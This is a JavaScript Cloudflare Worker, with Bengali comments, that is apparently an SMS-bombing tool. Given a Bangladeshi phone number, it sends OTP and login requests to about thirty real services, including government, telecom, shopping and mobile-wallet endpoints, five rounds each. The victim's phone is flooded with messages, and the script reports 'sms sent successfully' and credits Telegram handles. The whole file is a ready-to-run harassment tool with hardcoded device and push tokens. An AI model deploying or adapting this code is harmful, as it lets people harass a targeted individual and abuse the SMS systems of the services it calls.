export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone') || url.searchParams.get('number');

    // ফোন নম্বর ভ্যালিডেশন
    if (!phone || phone.trim() === '') {
      return new Response(
        JSON.stringify({ 
          error: "Mobile number is required",
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 400, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }

    if (!/^01[0-9]{9}$/.test(phone)) {
      return new Response(
        JSON.stringify({ 
          error: "Invalid phone number",
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 400, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }

    // সকল এপিআই এবং ডাইনামিক নম্বর বসানোর তালিকা
    const apis = [
      {
        url: "https://waltonplaza.com.bd/api/auth/otp/create",
        data: {
          auth: { countryCode: "880", deviceUuid: "ee757830-f639-12f0-9f4d-2f972746fhg", phone: phone },
          captchaToken: "recapcha"
        }
      },
      {
        url: "https://api.apex4u.com/api/auth/login",
        data: { phoneNumber: phone }
      },
      {
        url: "https://core.easy.com.bd/api/v1/forgot-password-otp",
        data: { device_key: "2ea97d276a980993308116baa292cec9", mobile: phone }
      },
      {
        url: "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        data: { phone: phone }
      },
      {
        url: "https://api.chardike.com/api/otp/send",
        data: { phone: phone, otp_type: "login" }
      },
      {
        url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
        data: { phoneNbr: phone, OTPType: 1.0, userName: "", email: "" }
      },
      {
        url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
        data: { phone: phone }
      },
      {
        url: "https://gateway.otithee.com/api/v1/generate-otp",
        data: { request_type: "registration", mobile_number: phone }
      },
      {
        url: "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        data: { country_code: "+88", phone: phone }
      },
      {
        url: "https://new.mojaru.com/api/student/login",
        data: { mobile_or_email: phone }
      },
      {
        url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
        data: { mobileNumber: phone }
      },
      {
        url: "https://api.garibookadmin.com/api/v3/user/login",
        data: { recaptcha_token: "garibookcaptcha", mobile: phone, channel: "web" }
      },
      {
        url: "https://api-dynamic.bioscopelive.com/v2/auth/login",
        data: { number: phone }
      },
      {
        url: "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo=" + phone,
        data: null,
        isGet: true
      },
      {
        url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        data: {
          wallet_number: phone,
          geo_location: { lat: 23.8979093, long: 89.1356346 },
          referral: "",
          firebase_token: "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",
          device_uuid: "c65m117a8cbf5b1851b29f8b",
          mno: "Robi"
        }
      },
      {
        url: "https://api-dynamic.chorki.com/v2/auth/login",
        data: { number: phone }
      },
      {
        url: "https://api.deeptoplay.com/v2/auth/login",
        data: { number: phone }
      },
      {
        url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        data: { phoneNumber: phone }
      },
      {
        url: "https://bb-api.bohubrihi.com/public/activity/otp",
        data: { phone: phone, intent: "login" }
      },
      {
        url: "https://backend.timezonebd.com/api/v1/user/otp-login",
        data: { phone: phone }
      },
      {
        url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        data: { phone: phone, language: "en", email: "" }
      },
      {
        url: "https://api.shikho.com/public/activity/otp",
        data: { phone: phone, intent: "ap-discount-request" }
      },
      {
        url: "https://edgecoursebd.com/register",
        data: { phone: phone }
      },
      {
        url: "https://api.ghoorilearning.com/api/auth/signup/otp",
        data: { mobile_no: phone }
      },
      {
        url: "https://api.ostad.app/api/v2/user/with-otp",
        data: { msisdn: phone }
      },
      {
        url: "https://www.ieducationbd.com/api/account/check_user",
        data: { mobile: phone }
      },
      {
        url: "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        data: { userPhone: phone, otp: "" }
      },
      {
        url: "https://www.shwapno.com/api/auth",
        data: { phoneNumber: phone }
      },
      {
        url: "https://api.osudpotro.com/api/v1/users/send_otp",
        data: { mobile: phone, deviceToken: "web", language: "en", os: "web" }
      }
    ];

    let promises = [];
    const loops = 5; // আপনার চাহিদা অনুযায়ী লুপ বা রিকোয়েস্ট সংখ্যা

    for (let i = 0; i < loops; i++) {
      for (const api of apis) {
        let fetchOptions = {
          method: api.isGet ? "GET" : "POST",
          headers: { 'Content-Type': 'application/json' }
        };
        if (!api.isGet && api.data) {
          fetchOptions.body = JSON.stringify(api.data);
        }
        promises.push(
          fetch(api.url, fetchOptions).catch(err => ({ error: err.message }))
        );
      }
    }

    // ব্যাকগ্রাউন্ডে রিকোয়েস্টগুলো একসাথে এক্সিকিউট করার জন্য
    ctx.waitUntil(Promise.all(promises));

    const responseData = {
      status: "sms sent successfully",
      phone: phone,
      totalRequests: promises.length,
      Api_Owner: '@MehediSanix',
      Telegram: '@CobraX_Empire',
      Developer: '@XrootCodeX'
    };

    return new Response(JSON.stringify(responseData, null, 2), {
      status: 200,
      headers: { 'Content-Type': 'application/json; charset=utf-8' }
    });
  }
};
